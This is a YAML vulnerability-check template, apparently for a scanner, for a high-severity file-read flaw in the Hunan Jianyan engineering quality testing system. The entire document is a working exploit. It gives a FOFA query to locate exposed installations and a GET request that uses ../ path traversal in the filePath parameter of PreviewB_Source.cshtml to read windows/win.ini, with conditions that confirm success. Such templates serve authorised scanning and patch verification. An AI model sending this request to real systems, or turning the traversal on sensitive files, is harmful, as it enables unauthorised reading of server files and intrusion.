id: poc-yaml-hunanjianyan-detection-system-previewb-source-fileread
info:
  name: 湖南建研工程质量检测系统 /Applications/Attachment/PreviewB_Source.cshtml 文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 湖南建研检测系统
  fofa: body="/Content/Theme/Standard/"
requests:
- method: GET
  path: /Applications/Attachment/PreviewB_Source.cshtml?filePath=../../../../../windows/win.ini
  expression: "status_code == 200 && \ncontains(body, \"bit app support\") && \ncontains(body,\"\
    fonts\") &&\ncontains(body,\"extensions\")\n"
variables: {}
transport: http
